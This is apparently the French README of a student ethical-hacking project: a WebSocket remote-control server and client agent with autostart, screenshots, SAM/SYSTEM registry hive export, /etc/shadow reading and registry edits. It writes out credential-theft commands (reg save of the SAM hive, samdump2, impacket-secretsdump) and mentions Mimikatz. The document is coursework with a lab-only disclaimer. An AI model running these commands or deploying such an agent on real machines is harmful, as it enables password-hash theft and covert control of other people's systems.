# TP Python - Ethical Hacking

## ⚠️ AVERTISSEMENT IMPORTANT

**Ce projet est destiné UNIQUEMENT à des fins éducatives et de recherche en cybersécurité.**

- ⚠️ L'utilisation de ces outils sur des systèmes sans autorisation explicite est **ILLÉGALE**
- ✅ À utiliser uniquement dans un environnement contrôlé (VM, laboratoire isolé)
- 🎓 Cadre pédagogique : BIN A3 CYBER - Ethical Hacking
- ⚖️ L'auteur décline toute responsabilité en cas d'usage malveillant

---

## 👨‍💻 Auteurs

**Projet réalisé dans le cadre du BIN A3 CYBER - Ethical Hacking**

- Nicolas Cholin
- Théotime Ricaux

---

## 📋 Description

Projet d'architecture client-serveur permettant l'administration et le contrôle à distance de machines Windows et Linux via WebSockets sécurisés. Implémente une authentification par HMAC SHA-256 et supporte l'exécution de commandes système à distance.

**Technologies utilisées :**
- 🔌 WebSockets pour la communication temps réel
- 🔒 HMAC SHA-256 pour l'authentification
- 🔄 Multi-processus avec fork pour la scalabilité
- 📝 Logging détaillé des sessions
- 🖥️ Support cross-platform (Windows/Linux)

---

## 🏗️ Architecture

### 📡 Serveur (`Server.py`)

Serveur WebSocket multi-processus avec les fonctionnalités suivantes :

- ✅ **WebSocket Server** : Écoute sur `0.0.0.0:8765` (configurable)
- ✅ **Multi-processus** : 2 workers par défaut (configurable via `WORKERS`)
- ✅ **Authentification HMAC** : Validation cryptographique des clients
- ✅ **Logging avancé** : Logs de session dans `server_logs/`
- ✅ **Gestion d'erreurs** : Timeouts, exceptions, reconnexions
- ✅ **Commandes scriptées** : Exécution séquentielle des commandes

### 🤖 Client (`Client.py`)

Agent multi-plateforme avec auto-reconnexion :

#### Fonctionnalités Communes (Windows/Linux)
- ✅ Récupération des adresses IP (hors localhost)
- ✅ Exécution de commandes shell sécurisées (liste blanche)
- ✅ Captures d'écran (via `mss`)
- ✅ Configuration du démarrage automatique
- ✅ Gestion robuste des erreurs et timeouts
- ✅ Reconnexion automatique en cas de déconnexion

#### Fonctionnalités Spécifiques Windows
- 🪟 **Récupération base SAM** : Export de `HKLM\SAM` et `HKLM\SYSTEM` (admin requis)
- 🪟 **Modification du registre** : Création/modification de clés dans le registre

#### Fonctionnalités Spécifiques Linux
- 🐧 **Récupération passwd/shadow** : Lecture de `/etc/passwd` et `/etc/shadow` (root requis)
- 🐧 **Exploration système** : Listing récursif de `/root` et `/home`

---

## 📁 Structure du Projet

```
tp-python-EH/
├── Client.py           # Agent client (Windows/Linux)
├── Server.py           # Serveur WebSocket multi-processus
├── common.py           # Fonctions partagées (HMAC, JSON, timestamp)
├── README.md           # Documentation
├── test_sam.py         # Script de test pour extraction SAM
├── extract_sam.bat     # Script batch pour extraction SAM (Windows)
├── screens/            # Captures d'écran (créé automatiquement)
├── server_logs/        # Logs des sessions (créé automatiquement)
├── sam_export.hiv      # Export SAM (si extraction réussie)
└── system_export.hiv   # Export SYSTEM (si extraction réussie)
```

---

## 📜 Commandes Disponibles

| ID  | Commande              | Description                                    | OS      |
|-----|-----------------------|------------------------------------------------|---------|
| 1   | `whoami`              | Retourne l'utilisateur actuel                  | All     |
| 2   | `get_ips`             | Liste les IPs (hors localhost)                 | All     |
| 3   | `list`                | Liste le contenu d'un dossier                  | All     |
| 4   | `uptime`              | Temps de fonctionnement du système             | Linux   |
| 5   | `screenshot`          | Capture d'écran                                | All     |
| 6   | `run_shell`           | Exécute une commande shell autorisée           | All     |
| 7   | `setup_autostart`     | Configure le démarrage automatique             | All     |
| 8   | `get_simulated_sensitive` | Données sensibles (démo)                   | All     |
| 9   | `get_sam`             | Exporte la base SAM Windows                    | Windows |
| 10  | `add_registry`        | Ajoute une clef dans le registre Windows       | Windows |
| 11  | `get_passwd_shadow`   | Récupère /etc/passwd et /etc/shadow            | Linux   |
| 12  | `list_root_home`      | Liste /root et /home récursivement             | Linux   |

### 🔒 Commandes Shell Autorisées (Liste Blanche)

Pour des raisons de sécurité, seules ces commandes shell sont autorisées :
- `echo hello from server`
- `whoami`
- `hostname`
- `ipconfig` (Windows) / `ip a` (Linux)
- `dir` (Windows) / `ls -la` (Linux)

---

## 🚀 Installation

### Prérequis

- Python 3.7+
- pip (gestionnaire de paquets Python)

### Dépendances

```bash
# Installation des dépendances (Windows et Linux)
pip install websockets psutil mss
```

### Configuration

#### 1. Configuration du Serveur (`Server.py`)

```python
HOST = "0.0.0.0"      # Interface d'écoute (0.0.0.0 = toutes)
PORT = 8765           # Port d'écoute
WORKERS = 2           # Nombre de processus workers
```

#### 2. Configuration du Client (`Client.py`)

```python
SERVER = "ws://192.168.100.3:8765"  # Remplacer par l'IP du serveur
```

#### 3. Clé Secrète (`common.py`)

```python
SECRET_KEY = b"supersecretkey123"   # ⚠️ Changer en production !
```

---

---

## 💻 Utilisation

### Démarrer le Serveur

```bash
# Sur la machine serveur (Kali Linux ou autre)
python Server.py
```

**Sortie attendue :**
```
2025-11-09 14:30:00,123 [INFO] Spawned worker-1 pid=1234
2025-11-09 14:30:00,124 [INFO] Spawned worker-2 pid=1235
2025-11-09 14:30:00,156 [INFO] [worker-1] Worker 1234 écoute sur 0.0.0.0:8765
2025-11-09 14:30:00,157 [INFO] [worker-2] Worker 1235 écoute sur 0.0.0.0:8765
```

### Démarrer le Client

```bash
# Sur la machine cible (Windows - utilisateur normal)
python Client.py

# Sur la machine cible (Windows - avec privilèges admin pour SAM/Registry)
# Ouvrir PowerShell en tant qu'Administrateur puis :
python Client.py

# Sur la machine cible (Linux - certaines commandes nécessitent root)
sudo python Client.py
```

**Le client va :**
1. ✅ Se connecter au serveur
2. ✅ S'authentifier via HMAC
3. ✅ Recevoir et exécuter les commandes
4. ✅ Renvoyer les résultats
5. ✅ Se reconnecter automatiquement en cas de déconnexion

---

### 🪟 Extraction de la Base SAM (Windows)

Pour extraire la base SAM Windows, **deux méthodes** :

#### Méthode 1 : Via le Script Batch (Recommandé)

1. **Clic droit** sur `extract_sam.bat` → **"Exécuter en tant qu'administrateur"**
2. Les fichiers `sam.hiv` et `system.hiv` seront créés

#### Méthode 2 : Manuellement via PowerShell Admin

```powershell
# Ouvrir PowerShell en tant qu'Administrateur
cd "C:\Users\...\tp-python-EH"
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
```

#### Extraction des Hash de Mots de Passe

Une fois SAM et SYSTEM exportés, utilisez ces outils (sur Kali Linux) :

```bash
# Méthode 1 : samdump2
samdump2 system.hiv sam.hiv

# Méthode 2 : impacket-secretsdump
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

**Sortie attendue :**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

---

---

## 📝 Exemples de Commandes

Le serveur envoie automatiquement une séquence de commandes prédéfinies dans `COMMANDS`. Voici quelques exemples :

### Exemple 1 : Récupération SAM (Windows - Admin requis)

```python
{"id": 9, "cmd": "get_sam"}
```

**Résultat attendu :**
```
SAM database exportée:
- SAM: C:\...\sam_export.hiv (262144 bytes)
- SYSTEM: C:\...\system_export.hiv (8388608 bytes)
Utilisez des outils comme samdump2 ou impacket pour extraire les hash
```

### Exemple 2 : Ajout Clé Registre (Windows)

```python
{
    "id": 10, 
    "cmd": "add_registry", 
    "args": {
        "key_path": "HKEY_CURRENT_USER\\Software\\TestKey",
        "value_name": "TestValue",
        "value_data": "HelloFromServer",
        "value_type": "REG_SZ"
    }
}
```

### Exemple 3 : Récupération Passwd/Shadow (Linux - Root requis)

```python
{"id": 11, "cmd": "get_passwd_shadow"}
```

### Exemple 4 : Listing Système (Linux)

```python
{"id": 12, "cmd": "list_root_home"}
```

### Exemple 5 : Capture d'écran

```python
{"id": 5, "cmd": "screenshot"}
```

**Résultat :**
```
screenshot saved to C:\...\screens\screenshot.png
```

---

## 📊 Logs et Traçabilité

### Logs Serveur

Les logs de session sont automatiquement créés dans `server_logs/` :

```
server_logs/
├── session_DESKTOP-ABC123_20251109_143052.log
├── session_ubuntu-vm_20251109_143125.log
└── ...
```

**Contenu d'un log :**
```
2025-11-09 14:30:52 - === NOUVELLE SESSION ===
2025-11-09 14:30:52 - Client: DESKTOP-ABC123 (Windows)
2025-11-09 14:30:52 - IP: ('192.168.100.50', 54321)

2025-11-09 14:30:52 - >>> Commande envoyée: whoami (ID: 1)
2025-11-09 14:30:52 - <<< Réponse (Status: ok):
DESKTOP-ABC123\admin
--------------------------------------------------------------------------------
...
```

---

---

## 🔒 Sécurité

### Mécanisme d'Authentification HMAC

```python
# Création du HMAC côté client
hello = {"os": "Windows", "name": "PC-123", "ts": 1699534252}
minimal = json.dumps({"os": hello["os"], "name": hello["name"], "ts": hello["ts"]})
signature = hmac.new(SECRET_KEY, minimal.encode(), hashlib.sha256).hexdigest()

# Vérification côté serveur
verify_hmac(minimal.encode(), signature)  # True si valide
```

### ⚠️ Points d'Attention

- **Clé secrète** : `SECRET_KEY` est partagée → changer en production
- **Privilèges élevés** : Certaines commandes nécessitent admin/root
- **Liste blanche** : Les commandes shell sont limitées pour éviter les abus
- **Timeouts** : 30s par défaut, 120s pour les commandes sensibles
- **Logs** : Toutes les sessions sont tracées dans `server_logs/`

### Recommandations

1. ✅ Utiliser uniquement dans un environnement isolé (VM)
2. ✅ Changer `SECRET_KEY` avant utilisation
3. ✅ Restreindre les commandes autorisées selon les besoins
4. ✅ Surveiller les logs régulièrement
5. ✅ Ne jamais exposer le serveur sur Internet sans protection supplémentaire

---

---

## 🎓 Objectifs Pédagogiques

Ce projet permet d'apprendre :

1. **Programmation réseau** : WebSockets, protocoles client-serveur
2. **Sécurité** : HMAC, authentification, validation des entrées
3. **Programmation système** : Commandes shell, accès fichiers système
4. **Multiprocessing** : Fork, workers parallèles, gestion de processus
5. **Gestion d'erreurs** : Try/except, timeouts, reconnexions
6. **Cross-platform** : Code compatible Windows/Linux
7. **Logging** : Traçabilité et debugging
8. **Ethical Hacking** : Techniques d'administration à distance

---

## 🐛 Dépannage

### Problème : Client ne se connecte pas

**Solution :**
1. Vérifier que le serveur est démarré
2. Vérifier l'IP dans `Client.py` → `SERVER = "ws://IP:8765"`
3. Vérifier le pare-feu (autoriser port 8765)
4. Vérifier les logs serveur

### Problème : Authentification échouée

**Solution :**
1. Vérifier que `SECRET_KEY` est identique dans `common.py` (client et serveur)
2. Vérifier les logs : `Auth failed`

### Problème : Commandes Windows échouent (get_sam, add_registry)

**Causes possibles :**
1. ❌ Pas de droits administrateur
2. ❌ UAC (User Account Control) bloque l'accès
3. ❌ Timeout (commande prend trop de temps)

**Solutions :**
1. ✅ **Exécuter en tant qu'Administrateur** : Clic droit sur PowerShell → "Run as Administrator"
2. ✅ Vérifier que le fichier exporté n'est pas vide (0 bytes)
3. ✅ Utiliser le script `extract_sam.bat` en mode admin
4. ✅ Sur Windows 11/Credential Guard : utiliser des outils comme Mimikatz ou Volume Shadow Copy

**Vérification :**
```powershell
whoami /priv   # Vérifier les privilèges
dir *.hiv      # Vérifier la taille des fichiers exportés
```

### Problème : Timeout sur certaines commandes

**Solution :**
1. Augmenter `timeout_duration` dans `Server.py`
2. Vérifier la connexion réseau
3. Vérifier les permissions (admin/root)

---

## ⚖️ Licence

**Ce projet est destiné uniquement à des fins éducatives** dans le cadre du cours d'Ethical Hacking.

❌ **NE PAS UTILISER sur des systèmes sans autorisation explicite**  
❌ **L'auteur décline toute responsabilité en cas d'usage malveillant**

---





